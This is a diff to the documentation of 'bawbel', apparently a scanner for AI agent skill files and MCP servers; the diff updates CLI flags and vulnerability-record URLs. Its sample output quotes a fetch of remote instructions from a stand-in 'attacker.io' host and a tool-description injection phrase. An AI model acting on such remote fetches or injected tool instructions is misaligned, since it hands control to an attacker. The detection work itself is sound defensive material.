@@ -42,7 +42,7 @@ bawbel ssc https://server    # scan MCP server without starting it
 
 | Command | Description |
 |---|---|
-| `bawbel scan <path>` | Scan a skill file or directory for AVE vulnerabilities. Supports `--recursive`, `--format text\|json\|sarif`, `--fail-on-severity`, `--no-ignore`, `--watch` |
+| `bawbel scan <path>` | Scan a skill file or directory for AVE vulnerabilities. Supports `--recursive`, `--format text\|json\|sarif`, `--fail-on-severity`, `--require-engines`, `--no-ignore`, `--watch` |
 | `bawbel report <path>` | Scan a component and show a full remediation guide with fix guidance per finding |
 | `bawbel creds <path>` | Focused scan: hardcoded credentials and secret exposure only |
 | `bawbel chain <path>` | Focused scan: unsafe agent delegation chains only |
@@ -360,12 +360,12 @@ bawbel check-pins ./skills/
 CRITICAL  AVE-2026-00001  External instruction fetch detected
           line 3  fetch("https://attacker.io/payload.md")
           AIVSS 8.0  MCP03, MCP04
-          https://api.piranha.bawbel.io/records/AVE-2026-00001
+          https://api.aveproject.org/records/AVE-2026-00001
 
 HIGH      AVE-2026-00002  Tool description behavioral injection
           line 12  "IMPORTANT: before calling this tool, first..."
           AIVSS 7.3  MCP03, MCP10
-          https://api.piranha.bawbel.io/records/AVE-2026-00002
+          https://api.aveproject.org/records/AVE-2026-00002
 
 Toxic flow detected  CREDENTIAL_EXFIL_CHAIN
   AVE-2026-00003 + AVE-2026-00026 combined  AIVSS 9.8 CRITICAL
@@ -469,9 +469,14 @@ AARS is the sum of 10 Agentic Risk Amplification Factors scored per the
   "detection_stage": "static_detection",
   "detection_layer": "content",
   "owasp_mcp": ["MCP03", "MCP04"],
-  "piranha_url": "https://api.piranha.bawbel.io/records/AVE-2026-00001"
+  "piranha_url": "https://api.aveproject.org/records/AVE-2026-00001",
+  "ave_url": "https://api.aveproject.org/records/AVE-2026-00001"
 }
 ```
+
+`ave_url` is the link to the AVE record. `piranha_url` carries the same value and is
+deprecated: it is removed in 2.0. The opt-in false-positive signal sends nothing unless
+`BAWBEL_PIRANHA_URL` is set.
 
 ---
 
